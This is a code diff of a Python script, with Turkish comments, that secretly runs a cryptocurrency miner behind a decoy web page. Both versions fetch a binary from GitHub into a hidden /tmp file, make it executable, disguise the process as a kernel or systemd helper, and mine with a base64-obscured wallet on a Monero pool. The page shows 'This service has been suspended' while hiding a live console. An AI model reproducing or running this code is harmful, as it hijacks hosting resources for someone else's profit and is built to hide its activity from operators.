@@ -8,54 +8,32 @@ import ctypes
 import http.server
 import urllib.request
 import json
+import tempfile
 import re
 import resource
-import shutil
 from urllib.parse import urlparse
 from collections import deque
 
 libc = ctypes.CDLL('libc.so.6')
 CONSOLE_LOGS = deque(maxlen=50)
-STATUS = {"running": False, "message": "Service Idle"}
-
-WALLET_ADDR = base64.b64decode("WWFSYTdRNFVrUUdnM0JvU0tINnRFdWQybnRlSkNXWHVjWA==").decode()
+STATUS = {"running": False, "message": "Sistem Beklemede"}
+WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
 CF_WORKER_HOST = ""
 
 POOLS = [
-    "stratum+tcp://yenten-pool.info:63368"
+    "gulf.moneroocean.stream:10128"
 ]
 
 def clean_ansi(text):
     ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
     return ansi_escape.sub('', text)
 
-def mask_miner_output(text):
-    replacements = {
-        "cpuminer": "sys-worker",
-        "stratum": "stream",
-        "Stratum": "Stream",
-        "yespowerr16": "module-r16",
-        "accepted": "verified (OK)",
-        "yay!!!": "sync complete",
-        "cpu-pool.com": "remote-sync-node",
-        "miner": "worker",
-        "mining": "syncing",
-        "hashrate": "throughput",
-        "khash/s": "req/s",
-        "hash/s": "req/s"
-    }
-    for old, new in replacements.items():
-        text = text.replace(old, new)
-        text = text.replace(old.upper(), new.upper())
-    return text
-
 def log_to_console(msg):
     clean_msg = clean_ansi(msg)
-    masked_msg = mask_miner_output(clean_msg)
     timestamp = time.strftime("%H:%M:%S")
-    line = f"[{timestamp}] {masked_msg}"
+    line = f"[{timestamp}] {clean_msg}"
     CONSOLE_LOGS.append(line)
-    print(masked_msg)
+    print(msg)
 
 def set_process_name(name):
     try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
@@ -71,7 +49,7 @@ def kill_process(proc):
 
 def set_memory_limit():
     try:
-        limit_bytes = 536870912 # 512 MB Limit
+        limit_bytes = 536870912 # 512 MB
         resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
     except Exception as e:
         pass
@@ -79,31 +57,29 @@ def set_memory_limit():
 def execution_logic():
     global STATUS
     
-    tmp_path = '/tmp/.kworker-sys' 
+    # 1. Aşama: Dosyayı sadece ilk başta bir kere indir
     try:
-        if not os.path.exists(tmp_path):
-            log_to_console("System initialization started. Core modules downloading...")
-            url = "https://github.com/render01734/va/raw/refs/heads/main/z"
-            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-            with urllib.request.urlopen(req) as response:
-                binary_content = response.read()
-            
-            with open(tmp_path, 'wb') as f:
-                f.write(binary_content)
-            
-            os.chmod(tmp_path, 0o755)
-            log_to_console("Core modules initialized successfully.")
-        else:
-            log_to_console("Modules verified.")
-            
-        set_process_name("kworker/u4:2")
+        log_to_console("Sistem başlatılıyor. Çekirdek indirilecek...")
+        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
+        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+        with urllib.request.urlopen(req) as response:
+            binary_content = response.read()
+        
+        tmp_path = '/tmp/.kernel-sys'
+        with open(tmp_path, 'wb') as f:
+            f.write(binary_content)
+        
+        os.chmod(tmp_path, 0o755)
+        log_to_console("Çekirdek başarıyla hazırlandı.")
+        set_process_name("systemd-helper")
         
     except Exception as e:
         STATUS["running"] = False
-        STATUS["message"] = "Init Error"
-        log_to_console(f"CRITICAL SYSTEM ERROR (Init): {str(e)}")
-        return 
+        STATUS["message"] = "İndirme Hatası"
+        log_to_console(f"KRİTİK HATA (İndirme): {str(e)}")
+        return # İndirme başarısızsa başlama
 
+    # 2. Aşama: Sonsuz Döngü (Kapanırsa tekrar başlatır)
     while True:
         try:
             pools_to_try = []
@@ -112,62 +88,53 @@ def execution_logic():
             pools_to_try.extend(POOLS)
             
             STATUS["running"] = True
-            STATUS["message"] = "Background Sync Active"
+            STATUS["message"] = "Sistem Aktif"
             
-            # Otomatik çekirdek tespiti ve %99 limit hesaplaması
-            core_count = os.cpu_count() or 1
-            target_limit = int((core_count * 100) * 0.99)
-            
-            for pool_host in pools_to_try:
-                log_to_console(f"Connecting to remote sync node: {pool_host} (Cores: {core_count}, Limit: {target_limit}%)")
+            for pool_index, pool_host in enumerate(pools_to_try):
+                log_to_console(f"Bağlantı deneniyor: {pool_host}")
                 
-                miner_cmd = [
-                    tmp_path, 
-                    "-a", "yespowerr16", 
-                    "-o", pool_host, 
-                    "-u", WALLET_ADDR,
-                    "-p", f"node-{int(time.time())%1000},c=YTN",
-                    "-t", str(core_count) 
+                use_tls = ":443" in pool_host
+                cmd = [
+                    tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
+                    "-p", f"node-{int(time.time())%1000}~ghostrider", "--keepalive",
+                    "--donate-level=1", "--cpu-max-threads-hint", "100"
                 ]
-                
-                # cpulimit aracı sistemde kuruluysa kullan, yoksa direkt çalıştır
-                if shutil.which("cpulimit"):
-                    cmd = ["cpulimit", "-l", str(target_limit), "--"] + miner_cmd
-                else:
-                    log_to_console("WARNING: cpulimit not found. CPU will run at 100%.")
-                    cmd = miner_cmd
+                if use_tls:
+                    cmd.append("--tls")
                 
                 proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                                        text=True, env={"PATH": "/usr/bin:/bin:/usr/local/bin:/usr/sbin", "HOME": "/tmp"},
+                                        text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
                                         preexec_fn=set_memory_limit)
                 
                 error_count = 0
                 max_errors = 5
                 
+                # Madencinin çıktılarını oku
                 for line in iter(proc.stdout.readline, ""):
                     if not line:
-                        break 
+                        break # Process kapandı
                         
                     log_to_console(f"{line.strip()}")
                     
-                    if "connection failed" in line.lower() or "connection refused" in line.lower():
+                    if "read error" in line.lower() or "connection refused" in line.lower():
                         error_count += 1
                         if error_count >= max_errors:
-                            log_to_console("Multiple stream errors, restarting thread...")
-                            break 
+                            log_to_console("Çok fazla bağlantı hatası, süreç durduruluyor...")
+                            break # Hata limiti aşıldı, süreci öldür ve diğer havuza geç
                     
                     if "accepted" in line.lower():
-                        error_count = 0 
+                        error_count = 0 # Başarılı gönderimde hata sayacını sıfırla
                 
+                # Eğer buraya geldiysek madenci kapanmış veya biz break atmışızdır.
                 kill_process(proc)
-                log_to_console(f"Stream disconnected from {pool_host}.")
-                time.sleep(3) 
+                log_to_console(f"{pool_host} ile bağlantı koptu veya madenci kapandı.")
+                time.sleep(3) # Aşırı hızlı yeniden başlatmayı önlemek için bekle
                 
-            log_to_console("Cycle completed, restarting main loop...")
+            log_to_console("Tüm havuz listesi bitti, ana döngü baştan başlatılıyor...")
             time.sleep(5)
             
         except Exception as e:
-            log_to_console(f"Runtime error: {str(e)}")
+            log_to_console(f"Çalışma zamanı hatası: {str(e)}")
             time.sleep(5)
 
 class ControlHandler(http.server.BaseHTTPRequestHandler):
@@ -184,7 +151,7 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
         self.end_headers()
         
         html = f"""
-        <html><head><title>System Diagnostics</title><style>
+        <html><head><title>Service Suspended</title><style>
             body {{ background: #fff; color: #000; font-family: 'Times New Roman', Times, serif; margin: 0; padding: 10px; }}
             #fake-page {{ display: block; }}
             #real-console {{ display: none; background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; min-height: 100vh; box-sizing: border-box; }}
@@ -193,13 +160,13 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
             .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
         </style></head><body>
             
-            <div id="fake-page">This diagnostic page is currently unavailable.</div>
+            <div id="fake-page">This service has been suspended by its owner.</div>
             
             <div id="real-console">
                 <div class="panel">
-                    <h2>SYSTEM DIAGNOSTICS & TELEMETRY</h2>
-                    <p>STATUS: <span class="stat">{STATUS['message']}</span></p>
-                    <div id="console">Awaiting telemetry data...</div>
+                    <h2>KERNEL CONTROL UNIT</h2>
+                    <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
+                    <div id="console">Konsol bekleniyor...</div>
                 </div>
             </div>
 
@@ -229,6 +196,7 @@ class ControlHandler(http.server.BaseHTTPRequestHandler):
                         const logs = await r.json();
                         const c = document.getElementById('console');
                         
+                        // Sadece yeni log varsa aşağı kaydır
                         let isScrolledToBottom = c.scrollHeight - c.clientHeight <= c.scrollTop + 50;
                         c.innerHTML = logs.join('<br>');
                         if(isScrolledToBottom) {{
@@ -254,7 +222,7 @@ def run():
     if not STATUS["running"]:
         threading.Thread(target=execution_logic, daemon=True).start()
         
-    print(f"[SYSTEM] Local diagnostic interface binding to port {port}...")
+    print(f"Web sunucusu {port} portunda başlatılıyor...")
     http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()
 
 if __name__ == "__main__":
